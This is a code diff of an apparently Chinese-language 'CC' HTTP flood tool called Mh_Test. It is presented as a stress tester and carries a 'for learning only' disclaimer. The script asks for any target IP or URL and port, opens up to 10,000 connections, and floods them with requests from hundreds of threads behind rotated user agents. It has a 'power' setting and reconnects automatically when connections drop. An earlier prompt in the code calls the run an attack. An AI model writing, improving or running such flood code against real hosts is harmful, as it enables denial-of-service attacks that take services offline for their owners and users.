@@ -1,9 +1,8 @@
-import socket,sys,time
+import socket,sys,time,os
 import threading as th
 from random import choice,randint
 from tqdm import tqdm
-from os import _exit
-m,version,m1='release','v0.0.1','(c)Copyrighgt 2025 _MhwsChina_'
+version,m1='b0.0.2a','(c)Copyrighgt 2025 _MhwsChina_'
 useragents=[
     'Java/21.0.3',
     'Python-urllib/2.5',
@@ -31,6 +30,7 @@ accepts=[
 ]
 lock,lock1=th.RLock(),th.RLock()
 clients=[]
+closed_conn=[]
 cindex=0
 qs,qe=0,0
 def fmnum(num):
@@ -53,10 +53,15 @@ def getln(txt,typ=str,n=None,ls=[],err='输入不正确,请重新输入!'):
         try:tmp=typ(tmp);break
         except:print(err)
     return tmp
-def print(*args,end='\n'):
-    sys.stdout.write(' '.join(map(str,[*args]))+end)
-def log(*args,mode='INFO',end='\n',start=''):
-    txt=' '.join([*args])
+def print(*args,end=''):
+    txt=' '.join(map(str,[*args]))
+    l=0
+    for i in txt:
+        if ord(i)<=255:l+=1
+        else:l+=2
+    txt=txt+(os.get_terminal_size().columns-l)*' '
+    sys.stdout.write(txt+end)
+def log(txt,mode='INFO',end='',start=''):
     t=time.strftime('%H:%M:%S',time.localtime(time.time()))
     print(f'{start}[{t} {mode}]: {txt}',end=end)
 class mht_default(th.Thread):
@@ -77,7 +82,8 @@ class mht_default(th.Thread):
             lock.acquire()
             if cindex>=cn:cindex=0
             tmpa=cindex
-            client=clients[cindex]
+            try:client=clients[tmpa]
+            except:pass
             cindex+=1
             lock.release()
             try:
@@ -86,9 +92,14 @@ class mht_default(th.Thread):
                     qs+=1
             except Exception as ad:
                 qe+=1
-                log(f'[-] @ {c} ',str(ad),mode='ERROR')
-                clients.append(create_client())
-                del clients[tmpa]
+                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR',start='\r',end='')
+                while 1:
+                    try:
+                        clients.append(create_client())
+                        break
+                    except:pass
+                try:del clients[tmpa]
+                except:pass
 def create_client():
     ip1=ip.split('/')[0]
     while 1:
@@ -107,16 +118,18 @@ def sclient():
         clients.append(create_client())
         cbar.update(1)
         cntmp1+=1
-log('Mh_Test',m,version)
-log('Mh cc压力测试工具')
-log('源码:https://github.com/MhwsChina/Mh_Test')
+log(' * Mh_Test '+version)
+log(' * Code:   https://github.com/MhwsChina/Mh_Test')
+log(' * Auther: _MhwsChina_')
+log(' * Text:   cc压力测试工具，请勿用于非法用途，仅供学习参考',mode='WARN')
+log(' * Text:   使用该工具产生的后果作者概不负责',mode='WARN')
 ip=getln('IP/网址:').replace('http://','').replace('https://','')
 page=ip.split('/')
 page='/' if len(page)==1 else '/'+'/'.join(page[1:])
-port=getln('PORT/端口:',int)
-cn=getln('CONNECT/连接数(1000):',int,1000)
-thread=getln('THREAD/发包线程(500):',int,500)
-cnt=getln('威力[(10=普通)(50=高)(100=核爆)]:',int,100)
+port=getln('PORT/端口:',int,80)
+cn=getln('CONNECT/连接数(10000):',int,10000)
+thread=getln('THREAD/发包线程(800):',int,800)
+cnt=getln('威力[(10=普通)(50=高)(100=极高)]:',int,100)
 tm=getln('TIME/攻击持续时间:',int,60)
 log('创建连接')
 cntmp=list(range(cn))
@@ -137,20 +150,26 @@ for i in range(thread):
         mht_default().start()
     except:pass
 log('加载完毕')
-input('按下Enter开始攻击')
+debug=1 if getln('DEBUG MODE?(Y/n)',str,'n',['Y','n'])=='Y' else 0
+input('按下Enter开始压测')
 lock.release()
 qss=0
-bar=tqdm(range(tm),ascii=True,dynamic_ncols=True)
+bar=tqdm(range(tm),ascii=True,dynamic_ncols=True,mininterval=0.00000000001)
 for i in bar:
     time.sleep(1)
-    bar.set_postfix(send=fmnum(qs))
+    bar.set_postfix(send=fmnum(qs),client=fmnum(len(clients)))
     qss+=qs
     qs=0
-bar.close()
 log('等待线程停止')
 lock.acquire()
 log('关闭连接')
-del clients
+clients.clear()
+log('清空连接')
+while clients:
+    clients.clear()
+    time.sleep(1)
+bar.close()
 log('压测完成')
-log(f'压测总时长:{tm},请求数:{fmnum(qss)},线程数:{thread},连接数:{cn},错误次数:{qe}')
+log(f'压测总时长:{tm},请求数:{fmnum(qss)},线程数:{fmnum(thread)},连接数:{fmnum(cn)},请求错误次数:{fmnum(qe)}')
 input('按Enter键退出...')
+os._exit(0)
